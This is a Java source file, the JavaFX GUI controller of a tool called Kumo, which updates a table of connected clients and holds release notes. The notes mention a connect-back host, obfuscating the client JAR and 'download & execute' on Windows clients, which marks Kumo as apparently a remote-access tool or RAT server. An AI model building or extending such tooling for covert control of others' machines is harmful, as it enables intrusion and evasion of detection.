package GUI;

import GUI.Components.BottomBar;
import Server.ClientObject;
import Server.Data.PseudoBase;
import Server.Data.Repository;
import Server.KumoSettings;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.scene.Scene;
import javafx.scene.control.TableView;
import javafx.scene.layout.Pane;

import static GUI.Components.ClientList.getTableView;

public class Controller implements Repository {

    /* Reloads the table to ensure Offline/Online status is accurate. */
    public static void updateTable() {
        ObservableList<ClientObject> list = FXCollections.observableArrayList();
        list.addAll(PseudoBase.getKumoData().values());
        getTableView().setItems(list);
        TableView tableView = getTableView();
        tableView.refresh();
    }

    /* Refreshes the number of connections based on KumoData size. */
    public static void updateStats() {
        Platform.runLater(() -> BottomBar.getConnectionsLabel().setText("  Clients: " + CONNECTIONS.size() + " \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t Version " + KumoSettings.CURRENT_VERSION + " | Developer: Clova" ));
    }

    /* Changes the primary view to the provided scene. */
    public static void changePrimaryStage(Pane newScene) {
        KUMO.Kumo.getPrimaryStage().setScene(new Scene(newScene, 900, 500));
    }

    public static String getReleaseNotes(){
        String s = "Release notes: Kumo v" + KumoSettings.CURRENT_VERSION + "\n" +
                "\tNew features:\n" +
                "\t\t- Updated UI\n" +
                "\t\t\t- Updated bottom bar color to purple text on white background.\n" +
                "\t\t\t- Now \"Home\" screen is the client list.\n" +
                "\t\t\t- Changed top bar to have navigation tiles.\n" +
                "\t\t\t- Changed exit button hover color (red -> mediumslateblue).\n" +
                "\t\t- Add release notes menu.\n" +
                "\t\t- Add the ability to put a domain name for a connect-back host.\n" +
                "\t\t- Added more server logging.\n" +
                "\t\t- Add the ability to generate ProGuard obfuscation rules for the client JAR.\n\n" +
                "\tBug fixes:\n" +
                "\t\t- Fix download & execute so it works on Windows clients.\n" +
                "\t\t- Fix client exit on Windows.\n";
        return s;
    }
}
